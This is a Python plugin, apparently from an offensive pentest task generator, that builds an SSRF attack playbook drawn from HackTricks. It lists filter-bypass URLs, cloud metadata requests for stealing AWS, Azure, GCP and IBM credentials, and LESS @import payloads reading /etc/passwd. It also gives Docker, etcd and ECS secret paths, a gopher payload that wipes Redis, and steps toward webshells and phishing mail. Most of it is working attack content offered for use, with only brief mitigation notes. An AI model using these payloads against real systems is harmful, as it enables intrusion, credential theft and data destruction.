"""
SSRF (Server-Side Request Forgery) attack plugin

Generates tasks for SSRF exploitation including:
- URL format bypass techniques (localhost variations, encoding, parser confusion)
- Cloud metadata exploitation (AWS/Azure/GCP/IBM/Oracle/Alibaba)
- LESS code injection to SSRF
- Protocol smuggling (gopher, file, dict)
- Container metadata (Docker, Kubernetes, ECS)
- DNS rebinding and filter bypass

Extracted from HackTricks:
- pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md
- pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md
- pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms.md
- pentesting-web/less-code-injection-ssrf.md

Generated by: CrackPot v1.0
Date: 2025-10-07
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SSRFAttacksPlugin(ServicePlugin):
    """SSRF attack techniques plugin (URL bypass, cloud metadata, protocol smuggling)"""

    @property
    def name(self) -> str:
        return "ssrf-attacks"

    @property
    def default_ports(self) -> List[int]:
        # SSRF is application-layer, not port-specific
        return [80, 443, 8080, 8000, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP services where SSRF might be exploitable"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Match HTTP-based services
        if any(svc in service for svc in ['http', 'https', 'www', 'web']):
            return True

        # Common web ports
        if port in [80, 443, 8000, 8008, 8080, 8443, 8888, 3000, 5000, 9000]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSRF attack task tree"""
        service = service_info.get('service', 'http')
        is_https = 'https' in service.lower() or port == 443

        protocol = 'https' if is_https else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'ssrf-attacks-{port}',
            'name': f'SSRF Attack Techniques (Port {port})',
            'type': 'parent',
            'children': []
        }

        # SECTION 1: URL Bypass Techniques
        tasks['children'].append(self._create_url_bypass_tasks(base_url, port))

        # SECTION 2: Cloud Metadata Exploitation
        tasks['children'].append(self._create_cloud_metadata_tasks(base_url, port))

        # SECTION 3: LESS Code Injection to SSRF
        tasks['children'].append(self._create_less_injection_tasks(base_url, port))

        # SECTION 4: Container & Platform Metadata
        tasks['children'].append(self._create_container_metadata_tasks(base_url, port))

        # SECTION 5: Protocol Smuggling
        tasks['children'].append(self._create_protocol_smuggling_tasks(base_url, port))

        return tasks

    def _create_url_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create URL format bypass testing tasks"""
        return {
            'id': f'ssrf-url-bypass-{port}',
            'name': 'SSRF URL Format Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'ssrf-localhost-bypass-{port}',
                    'name': 'Localhost Representation Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test SSRF filters using alternative localhost representations',
                        'techniques': [
                            'Decimal: http://2130706433/ (127.0.0.1)',
                            'Octal: http://0177.0000.0000.0001',
                            'Hexadecimal: http://0x7f000001/',
                            'Mixed: http://0x7f.0x00.0x00.0x01',
                            'Short form: http://127.1',
                            'Zero notation: http://0 (Linux only)',
                            'IPv6: http://[::]:80/ or http://[0000::1]:80/',
                            'DNS tricks: localtest.me, 127.0.0.1.nip.io',
                            'Unicode: http://①②⑦.⓪.⓪.⓪'
                        ],
                        'success_indicators': [
                            'Bypass accepted by application',
                            'Internal service response received',
                            'localhost content returned'
                        ],
                        'failure_indicators': [
                            'Filter blocks all localhost formats',
                            'URL validation error',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Identify which format bypasses filter',
                            'Test against internal service discovery',
                            'Combine with cloud metadata endpoints'
                        ],
                        'alternatives': [
                            'Manual: Burp Repeater with param: url=http://0',
                            'Manual: curl -X POST -d "url=http://127.1" {base_url}',
                            'Tool: ffuf with localhost wordlist'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'BYPASS', 'SSRF'],
                        'notes': 'Burp extension: Burp-Encode-IP automates IP encoding bypasses. Test every discovered parameter (url=, target=, dest=, redirect=, uri=, path=)'
                    }
                },
                {
                    'id': f'ssrf-parser-confusion-{port}',
                    'name': 'URL Parser Confusion Attacks',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit differences between URL parsers (WHATWG vs RFC3986)',
                        'techniques': [
                            'Backslash trick: http://example.com\\@internal (WHATWG treats \\ as /)',
                            'Left bracket: http://example.com\\[@attacker.com',
                            'At-symbol abuse: http://example.com@attacker.com',
                            'Fragment abuse: http://metadata#/expected/path',
                            'Double slash: http:@0/ → http://localhost/',
                            'Malformed: localhost:+11211aaa',
                            'IPv6 zone ID: http://[fe80::1%25eth0]/ (%25 = encoded %)'
                        ],
                        'success_indicators': [
                            'Application parses differently than browser',
                            'Filter bypassed via parser confusion',
                            'Internal hostname accessed'
                        ],
                        'failure_indicators': [
                            'Strict URL validation',
                            'Both parsers reject payload',
                            'Canonicalization blocks bypass'
                        ],
                        'next_steps': [
                            'Test against Spring UriComponentsBuilder (CVE-2024-22243)',
                            'Test against urllib3 <1.26.15 (CVE-2023-27592)',
                            'Try mixed encoding combinations'
                        ],
                        'alternatives': [
                            'Manual: Test payloads in Burp Repeater',
                            'Tool: recollapse (regex bypass generator)',
                            'Tool: PortSwigger URL validation bypass cheat sheet'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'BYPASS'],
                        'notes': 'CVE-2024-22243: Spring parses http://example.com\\[@internal as example.com, browsers parse as internal. Upgrade to Spring 6.1.6+'
                    }
                },
                {
                    'id': f'ssrf-redirect-bypass-{port}',
                    'name': 'SSRF via Open Redirect',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 /tmp/ssrf_redirector.py 8000 http://169.254.169.254/latest/meta-data/',
                        'description': 'Bypass SSRF filters using HTTP 302 redirect to filtered destination',
                        'flag_explanations': {
                            '8000': 'Local HTTP server port',
                            'http://169.254.169.254/latest/meta-data/': 'Final SSRF target (cloud metadata)'
                        },
                        'success_indicators': [
                            'Redirect script running',
                            'Application follows redirect',
                            'Cloud metadata retrieved'
                        ],
                        'failure_indicators': [
                            'Redirect not followed',
                            'Filter blocks redirect destination',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Point SSRF parameter to your redirector: url=http://YOUR_IP:8000',
                            'Test gopher:// protocol via redirect',
                            'Try localhost services via redirect'
                        ],
                        'alternatives': [
                            'Manual: Use online redirect service',
                            'Manual: Create .htaccess redirect on compromised server',
                            'Tool: Burp Collaborator with redirect payload'
                        ],
                        'tags': ['OSCP:HIGH', 'BYPASS', 'QUICK_WIN'],
                        'notes': 'Redirect script creates 302 response. Some filters validate initial request but not redirect destination. Can escalate blind SSRF to RCE.'
                    }
                }
            ]
        }

    def _create_cloud_metadata_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create cloud metadata exploitation tasks"""
        return {
            'id': f'ssrf-cloud-metadata-{port}',
            'name': 'Cloud Metadata Service Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'ssrf-aws-metadata-{port}',
                    'name': 'AWS EC2 Metadata Extraction (IMDSv1 & v2)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract AWS IAM credentials and instance metadata via SSRF',
                        'commands': {
                            'IMDSv1 (GET only)': [
                                'http://169.254.169.254/latest/meta-data/',
                                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                                'http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]',
                                'http://169.254.169.254/latest/user-data',
                                'http://169.254.169.254/latest/dynamic/instance-identity/document'
                            ],
                            'IMDSv2 (token required)': [
                                'Step 1: PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"',
                                'Step 2: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: [TOKEN]"'
                            ]
                        },
                        'success_indicators': [
                            'IAM role name retrieved',
                            'AccessKeyId, SecretAccessKey, Token returned',
                            'Instance identity document retrieved'
                        ],
                        'failure_indicators': [
                            'IMDSv2 enforced (PUT required)',
                            'X-Forwarded-For header blocks token request',
                            'TTL=1 prevents container access'
                        ],
                        'next_steps': [
                            'Use credentials with aws-cli: aws s3 ls --profile [PROFILE]',
                            'Enumerate permissions with pacu',
                            'Check for privilege escalation paths'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://169.254.169.254/latest/meta-data/',
                            'Script: Automated enumeration script in cloud-ssrf.md',
                            'Tool: cloud_enum for AWS service discovery'
                        ],
                        'tags': ['OSCP:HIGH', 'CLOUD', 'CREDENTIALS', 'QUICK_WIN'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'IMDSv2 blocks: X-Forwarded-For header, TTL hop limit (containers), requires PUT. Check /user-data for hardcoded credentials. ECS containers: http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
                    }
                },
                {
                    'id': f'ssrf-azure-metadata-{port}',
                    'name': 'Azure VM Metadata & Managed Identity',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract Azure managed identity tokens and VM metadata',
                        'commands': {
                            'Instance Metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-12-13 -H "Metadata:true"',
                            'Management Token': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/ -H "Metadata:true"',
                            'Graph Token': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://graph.microsoft.com/ -H "Metadata:true"',
                            'Vault Token': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/ -H "Metadata:true"',
                            'No Header Required': 'http://169.254.169.254/metadata/v1/instanceinfo'
                        },
                        'success_indicators': [
                            'Metadata:true header accepted',
                            'Access token retrieved',
                            'Subscription ID, resource group returned'
                        ],
                        'failure_indicators': [
                            'Missing Metadata:true header',
                            'X-Forwarded-For header blocked',
                            'No managed identity attached'
                        ],
                        'next_steps': [
                            'Identify attached managed identities (system + user)',
                            'Request tokens for specific MI: ?object_id=, ?client_id=, ?msi_res_id=',
                            'Use token with az cli: az login --service-principal'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://169.254.169.254/metadata/instance',
                            'Tool: ROADtools for Azure enumeration',
                            'Script: PowerShell Invoke-RestMethod snippets'
                        ],
                        'tags': ['OSCP:HIGH', 'CLOUD', 'AZURE', 'CREDENTIALS'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Azure App Services use env vars: $IDENTITY_ENDPOINT, $IDENTITY_HEADER. Multiple MIs may be attached - brute force with az identity list. No Metadata:true header: /metadata/v1/instanceinfo'
                    }
                },
                {
                    'id': f'ssrf-gcp-metadata-{port}',
                    'name': 'GCP Metadata & Service Account Tokens',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract GCP service account tokens and compute metadata',
                        'commands': {
                            'Project ID': 'http://metadata.google.internal/computeMetadata/v1/project/project-id -H "Metadata-Flavor: Google"',
                            'Instance ID': 'http://metadata.google.internal/computeMetadata/v1/instance/id -H "Metadata-Flavor: Google"',
                            'Service Accounts': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ -H "Metadata-Flavor: Google"',
                            'Access Token': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"',
                            'SSH Keys': 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys -H "Metadata-Flavor: Google"',
                            'Kube-env (GKE)': 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env -H "Metadata-Flavor: Google"',
                            'Beta (no header)': 'http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true'
                        },
                        'success_indicators': [
                            'Metadata-Flavor: Google header accepted',
                            'Service account token retrieved',
                            'SSH keys or kube-env exposed'
                        ],
                        'failure_indicators': [
                            'Missing Metadata-Flavor header',
                            'No service account attached',
                            'Scopes too restrictive'
                        ],
                        'next_steps': [
                            'Use token: export CLOUDSDK_AUTH_ACCESS_TOKEN=[TOKEN]',
                            'Enumerate: gcloud projects list',
                            'Check token scopes: curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[TOKEN]'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                            'Tool: gcp_enum for GCP service discovery',
                            'Alternative URLs: http://metadata, http://169.254.169.254'
                        ],
                        'tags': ['OSCP:HIGH', 'CLOUD', 'GCP', 'CREDENTIALS'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Beta endpoint (v1beta1) does NOT require Metadata-Flavor header. Cloud Functions have limited metadata. GKE: kube-env contains cluster certs/tokens.'
                    }
                },
                {
                    'id': f'ssrf-other-clouds-{port}',
                    'name': 'Other Cloud Providers (IBM, Oracle, Alibaba, DigitalOcean)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract metadata from secondary cloud providers',
                        'endpoints': {
                            'IBM Cloud': {
                                'token': 'http://169.254.169.254/instance_identity/v1/token?version=2022-03-01 -X PUT -H "Metadata-Flavor: ibm"',
                                'instance': 'http://169.254.169.254/metadata/v1/instance?version=2022-03-01 -H "Authorization: Bearer [TOKEN]"',
                                'iam_creds': 'http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01 -X POST -H "Authorization: Bearer [TOKEN]"'
                            },
                            'Oracle Cloud': {
                                'meta-data': 'http://192.0.0.192/latest/meta-data/',
                                'user-data': 'http://192.0.0.192/latest/user-data/'
                            },
                            'Alibaba': {
                                'instance-id': 'http://100.100.100.200/latest/meta-data/instance-id',
                                'image-id': 'http://100.100.100.200/latest/meta-data/image-id'
                            },
                            'DigitalOcean': {
                                'metadata': 'http://169.254.169.254/metadata/v1.json',
                                'user-data': 'http://169.254.169.254/metadata/v1/user-data'
                            }
                        },
                        'success_indicators': [
                            'Cloud-specific metadata retrieved',
                            'IAM credentials or tokens obtained',
                            'User-data contains secrets'
                        ],
                        'failure_indicators': [
                            'Metadata not enabled (IBM default)',
                            'No credentials available (DigitalOcean)',
                            'IP range blocked'
                        ],
                        'next_steps': [
                            'IBM: Use IAM token for cloud API access',
                            'Oracle: Check user-data for provisioning scripts',
                            'Alibaba: Enumerate instance attributes'
                        ],
                        'alternatives': [
                            'Manual: Test each endpoint via SSRF parameter',
                            'Script: Cloud-specific enumeration scripts',
                            'Tool: cloud_enum with --provider flag'
                        ],
                        'tags': ['OSCP:MEDIUM', 'CLOUD', 'ENUM'],
                        'notes': 'IBM metadata disabled by default. DigitalOcean has no IAM-like credentials. Oracle uses 192.0.0.192 (not 169.254.x.x)'
                    }
                }
            ]
        }

    def _create_less_injection_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create LESS code injection to SSRF tasks"""
        return {
            'id': f'ssrf-less-injection-{port}',
            'name': 'LESS Code Injection → SSRF',
            'type': 'parent',
            'children': [
                {
                    'id': f'less-local-file-read-{port}',
                    'name': 'LESS @import Local File Read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit LESS CSS preprocessor to read local files via @import directive',
                        'payload': '1; @import (inline) "file:///etc/passwd"; @import (inline) "data:text/plain,@@END@@"; //',
                        'vulnerable_parameter': 'CSS preview endpoints (e.g., SugarCRM /rest/v10/css/preview?lm=)',
                        'success_indicators': [
                            'File contents appear in CSS response',
                            '@@END@@ marker visible',
                            '/etc/passwd contents leaked'
                        ],
                        'failure_indicators': [
                            'LESS escaping prevents injection',
                            'file:// protocol blocked',
                            'Input sanitization removes @import'
                        ],
                        'next_steps': [
                            'Read sensitive files: /etc/shadow, ~/.ssh/id_rsa, /var/www/html/config.php',
                            'Combine with path traversal: file:///var/www/../../etc/passwd',
                            'Test for SSRF to internal services'
                        ],
                        'alternatives': [
                            'Manual: Burp Repeater with payload in CSS param',
                            'Script: Automated PoC for SugarCRM (CVE-2024-58258)',
                            'Tool: LESS injection scanner'
                        ],
                        'tags': ['OSCP:HIGH', 'LFI', 'SSRF', 'INJECTION'],
                        'estimated_time': '5 minutes',
                        'notes': 'CVE-2024-58258: SugarCRM ≤14.0.0 vulnerable. Payload structure: close statement (;), inject @import, marker for extraction. Works when user input concatenated into LESS stylesheet.'
                    }
                },
                {
                    'id': f'less-cloud-metadata-{port}',
                    'name': 'LESS @import Cloud Metadata SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use LESS @import to trigger SSRF to cloud metadata services',
                        'payload': '1; @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/"; @import (inline) "data:text/plain,@@END@@"; //',
                        'targets': [
                            'AWS: http://169.254.169.254/latest/meta-data/',
                            'GCP: http://metadata.google.internal/computeMetadata/v1/',
                            'Azure: http://169.254.169.254/metadata/instance'
                        ],
                        'success_indicators': [
                            'Cloud metadata appears in CSS response',
                            'IAM credentials leaked',
                            '@@END@@ marker shows boundary'
                        ],
                        'failure_indicators': [
                            'HTTP requests blocked by LESS compiler',
                            'Metadata endpoint requires headers (GCP, Azure)',
                            'Network isolation prevents metadata access'
                        ],
                        'next_steps': [
                            'Extract IAM roles/credentials from response',
                            'Test internal service discovery: http://localhost:3306',
                            'Chain with redirect bypass for header injection'
                        ],
                        'alternatives': [
                            'Manual: URL-encode payload in CSS parameter',
                            'Manual: Test with different cloud provider IPs',
                            'Tool: Burp extension for LESS injection'
                        ],
                        'tags': ['OSCP:HIGH', 'SSRF', 'CLOUD', 'UNAUTHENTICATED'],
                        'notes': 'SugarCRM example: unauthenticated SSRF via /rest/v10/css/preview. GCP/Azure may fail due to required headers. Try v1beta1 (no header) for GCP.'
                    }
                },
                {
                    'id': f'less-detection-{port}',
                    'name': 'LESS Injection Detection & Mitigation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify vulnerable LESS compilation endpoints',
                        'detection_methods': [
                            'Look for dynamic CSS generation with user input',
                            'Search for .less or .css endpoints with query params',
                            'Code review: find LESS.render() with user data',
                            'Test injection: insert @import, (inline), file://'
                        ],
                        'vulnerable_patterns': [
                            '@media all { .preview { ... ${userInput} ... } }',
                            'CSS color/theme customization features',
                            'Dynamic stylesheet preview endpoints'
                        ],
                        'success_indicators': [
                            'Parameter reflected in compiled CSS',
                            '@import directive processed',
                            'External resource fetched'
                        ],
                        'failure_indicators': [
                            'Input escaped/sanitized',
                            '@import disabled in LESS config',
                            'Protocol whitelist (https only)'
                        ],
                        'next_steps': [
                            'Map all CSS generation endpoints',
                            'Test each parameter for injection',
                            'Check LESS version (older = more vulnerable)'
                        ],
                        'alternatives': [
                            'Manual: Burp Scanner with custom LESS payloads',
                            'Manual: Grep source code for LESS.render',
                            'Tool: Code analysis for CSS template injection'
                        ],
                        'tags': ['OSCP:MEDIUM', 'DETECTION', 'CODE_REVIEW'],
                        'notes': 'Patched in SugarCRM 13.0.4, 14.0.1. Mitigation: never pass untrusted data to LESS compiler, escape/whitelist input, disable (inline) imports.'
                    }
                }
            ]
        }

    def _create_container_metadata_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create container and platform metadata tasks"""
        return {
            'id': f'ssrf-container-metadata-{port}',
            'name': 'Container & Platform Metadata Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'docker-socket-ssrf-{port}',
                    'name': 'Docker Socket API via SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Access Docker socket via SSRF to enumerate containers and images',
                        'endpoints': [
                            'http://localhost:2375/containers/json (Docker API)',
                            'http://localhost:2375/images/json',
                            'http://localhost:2375/version',
                            'Unix socket: file:///var/run/docker.sock (if file:// enabled)'
                        ],
                        'success_indicators': [
                            'Container list returned',
                            'Image metadata retrieved',
                            'Docker version exposed'
                        ],
                        'failure_indicators': [
                            'Docker API not exposed on 2375',
                            'Unix socket not accessible via file://',
                            'Authentication required'
                        ],
                        'next_steps': [
                            'Enumerate running containers for sensitive env vars',
                            'Check for privileged containers',
                            'Attempt container escape techniques'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://localhost:2375/containers/json',
                            'Manual: curl --unix-socket /var/run/docker.sock http://foo/containers/json',
                            'Tool: Docker API fuzzer'
                        ],
                        'tags': ['OSCP:MEDIUM', 'DOCKER', 'CONTAINER'],
                        'estimated_time': '5 minutes',
                        'notes': 'Docker daemon on 2375 often misconfigured (no auth). Unix socket requires file:// protocol support. Container env vars may contain secrets.'
                    }
                },
                {
                    'id': f'kubernetes-etcd-{port}',
                    'name': 'Kubernetes ETCD Metadata',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract Kubernetes secrets from ETCD via SSRF',
                        'endpoints': [
                            'http://127.0.0.1:2379/version',
                            'http://127.0.0.1:2379/v2/keys/?recursive=true',
                            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env (GKE)'
                        ],
                        'success_indicators': [
                            'ETCD version returned',
                            'Kubernetes secrets enumerated',
                            'kube-env contains cluster certs/tokens'
                        ],
                        'failure_indicators': [
                            'ETCD not exposed on 2379',
                            'Authentication required',
                            'Network isolation blocks access'
                        ],
                        'next_steps': [
                            'Extract API keys, tokens, certificates',
                            'Enumerate cluster resources',
                            'Check for service account tokens in /var/run/secrets/kubernetes.io/'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://127.0.0.1:2379/v2/keys/',
                            'Tool: kubectl with stolen credentials',
                            'Manual: Read mounted service account token via LFI'
                        ],
                        'tags': ['OSCP:HIGH', 'KUBERNETES', 'SECRETS'],
                        'notes': 'GKE kube-env: cluster CA cert, kubelet credentials, cluster name. Service account tokens: /var/run/secrets/kubernetes.io/serviceaccount/token'
                    }
                },
                {
                    'id': f'aws-ecs-credentials-{port}',
                    'name': 'AWS ECS Container Credentials',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract ECS task credentials via metadata endpoint',
                        'workflow': [
                            'Step 1: Read env var $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI via LFI: file:///proc/self/environ',
                            'Step 2: SSRF to http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
                            'Step 3: Extract AccessKeyId, SecretAccessKey, Token from response'
                        ],
                        'success_indicators': [
                            'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI found',
                            'ECS task credentials retrieved',
                            'Token valid for AWS API calls'
                        ],
                        'failure_indicators': [
                            'Env var not accessible',
                            'Metadata endpoint returns 404',
                            'Credentials expired'
                        ],
                        'next_steps': [
                            'Test credentials: aws sts get-caller-identity',
                            'Enumerate ECS task permissions',
                            'Check if EC2 metadata also accessible (dual access)'
                        ],
                        'alternatives': [
                            'Manual: Combine LFI + SSRF in two steps',
                            'Manual: Read /proc/self/environ via path traversal',
                            'Tool: ECS enumeration with compromised creds'
                        ],
                        'tags': ['OSCP:HIGH', 'AWS', 'ECS', 'CONTAINER'],
                        'estimated_time': '10 minutes',
                        'notes': 'ECS containers may have access to BOTH container credentials (169.254.170.2) AND EC2 instance metadata (169.254.169.254). Test both endpoints.'
                    }
                },
                {
                    'id': f'rancher-metadata-{port}',
                    'name': 'Rancher Metadata Service',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract Rancher orchestration metadata',
                        'endpoint': 'http://rancher-metadata/latest/',
                        'success_indicators': [
                            'Rancher metadata service responds',
                            'Container/host information retrieved',
                            'Network configuration exposed'
                        ],
                        'failure_indicators': [
                            'Metadata service not available',
                            'DNS resolution fails',
                            'Network isolation blocks access'
                        ],
                        'next_steps': [
                            'Enumerate container environment',
                            'Map Rancher cluster structure',
                            'Check for exposed secrets'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=http://rancher-metadata/latest/',
                            'Tool: Rancher API enumeration',
                            'Manual: DNS enumeration for rancher-metadata hostname'
                        ],
                        'tags': ['OSCP:LOW', 'RANCHER', 'CONTAINER'],
                        'notes': 'Rancher-specific metadata service. Less common than Docker/K8s but high-value target in Rancher environments.'
                    }
                }
            ]
        }

    def _create_protocol_smuggling_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create protocol smuggling tasks"""
        return {
            'id': f'ssrf-protocol-smuggling-{port}',
            'name': 'Protocol Smuggling (Gopher, File, Dict)',
            'type': 'parent',
            'children': [
                {
                    'id': f'gopher-protocol-{port}',
                    'name': 'Gopher Protocol SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use gopher:// to interact with internal services (Redis, MySQL, SMTP)',
                        'payloads': {
                            'Redis': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a (FLUSHALL command)',
                            'MySQL': 'gopher://127.0.0.1:3306/_ (bypass authentication)',
                            'SMTP': 'gopher://127.0.0.1:25/_ (send email)',
                            'Memcached': 'gopher://127.0.0.1:11211/_stats (get stats)'
                        },
                        'success_indicators': [
                            'Gopher protocol accepted',
                            'Internal service responds',
                            'Command executed (Redis FLUSHALL)'
                        ],
                        'failure_indicators': [
                            'Gopher protocol blocked',
                            'Service requires binary protocol',
                            'URL parsing rejects gopher://'
                        ],
                        'next_steps': [
                            'Craft gopher payloads for specific services',
                            'Redis: Write webshell via config set dir/dbfilename',
                            'SMTP: Send phishing emails from internal server'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=gopher://127.0.0.1:6379/_...',
                            'Tool: Gopherus (gopher payload generator)',
                            'Manual: URL-encode gopher payload (%0d%0a for CRLF)'
                        ],
                        'tags': ['OSCP:HIGH', 'GOPHER', 'PROTOCOL_SMUGGLING'],
                        'estimated_time': '15 minutes',
                        'notes': 'Gopher payload structure: gopher://host:port/_[URL-encoded_commands]. CRLF = %0d%0a. Gopherus automates payload generation for Redis/MySQL/SMTP/etc.'
                    }
                },
                {
                    'id': f'file-protocol-{port}',
                    'name': 'File Protocol LFI via SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read local files using file:// protocol in SSRF',
                        'targets': [
                            'file:///etc/passwd',
                            'file:///etc/shadow',
                            'file:///var/www/html/config.php',
                            'file:///home/user/.ssh/id_rsa',
                            'file:///proc/self/environ (env vars)',
                            'file:///var/log/apache2/access.log'
                        ],
                        'success_indicators': [
                            'File:// protocol accepted',
                            'File contents returned',
                            'Sensitive data leaked'
                        ],
                        'failure_indicators': [
                            'File:// protocol blocked',
                            'Whitelist allows http/https only',
                            'Permission denied errors'
                        ],
                        'next_steps': [
                            'Read SSH keys for lateral movement',
                            'Extract database credentials from config files',
                            'Check for AWS credentials in ~/.aws/credentials'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=file:///etc/passwd',
                            'Manual: Combine with path traversal: file:///var/www/../../etc/passwd',
                            'Tool: SSRF scanner with file:// payloads'
                        ],
                        'tags': ['OSCP:HIGH', 'LFI', 'FILE_PROTOCOL'],
                        'estimated_time': '5 minutes',
                        'notes': 'File:// often blocked by URL parsers. Try: file:/etc/passwd (2 slashes), file:///etc/passwd (3 slashes). Windows: file:///C:/Windows/System32/drivers/etc/hosts'
                    }
                },
                {
                    'id': f'dict-protocol-{port}',
                    'name': 'Dict Protocol Service Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use dict:// protocol for internal service banner grabbing',
                        'usage': 'dict://127.0.0.1:PORT/ (grabs service banner)',
                        'targets': [
                            'dict://127.0.0.1:22/ (SSH banner)',
                            'dict://127.0.0.1:3306/ (MySQL banner)',
                            'dict://127.0.0.1:6379/ (Redis banner)',
                            'dict://127.0.0.1:11211/ (Memcached)'
                        ],
                        'success_indicators': [
                            'Dict protocol accepted',
                            'Service banner retrieved',
                            'Version information leaked'
                        ],
                        'failure_indicators': [
                            'Dict protocol blocked',
                            'Service does not respond to dict',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Identify service versions from banners',
                            'Research exploits for discovered versions',
                            'Map internal network services'
                        ],
                        'alternatives': [
                            'Manual: SSRF param → url=dict://127.0.0.1:22/',
                            'Manual: Port scan via dict:// (1-65535)',
                            'Tool: SSRF port scanner with dict protocol'
                        ],
                        'tags': ['OSCP:MEDIUM', 'DICT', 'ENUM'],
                        'estimated_time': '10 minutes',
                        'notes': 'Dict protocol useful for banner grabbing when other protocols blocked. Less common than gopher but often allowed by parsers.'
                    }
                },
                {
                    'id': f'protocol-bypass-tips-{port}',
                    'name': 'Protocol Smuggling Bypass Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass protocol filtering for gopher/file/dict',
                        'techniques': [
                            'Case variation: Gopher://, FILE://, DiCt://',
                            'URL encoding: gopher%3a//127.0.0.1',
                            'Double encoding: gopher%253a//127.0.0.1',
                            'Mixed protocols: http://localhost#gopher://127.0.0.1',
                            'Redirect: http://attacker.com → 302 → gopher://...',
                            'DNS tricks: gopher://127.0.0.1.nip.io',
                            'IPv6: gopher://[::1]:6379'
                        ],
                        'success_indicators': [
                            'Protocol filter bypassed',
                            'Internal service accessed',
                            'Restricted protocol executed'
                        ],
                        'failure_indicators': [
                            'Canonicalization normalizes protocol',
                            'Whitelist strictly enforced',
                            'All variants blocked'
                        ],
                        'next_steps': [
                            'Test every protocol with every bypass',
                            'Combine with URL parser confusion',
                            'Chain redirect + protocol smuggling'
                        ],
                        'alternatives': [
                            'Manual: Burp Intruder with protocol variations',
                            'Tool: SSRF payload generator with bypass list',
                            'Manual: Test via redirect server for header injection'
                        ],
                        'tags': ['OSCP:HIGH', 'BYPASS', 'ADVANCED'],
                        'notes': 'Redirect bypass most effective: filters validate initial HTTP request, not redirect destination. Some parsers case-sensitive for protocols.'
                    }
                }
            ]
        }
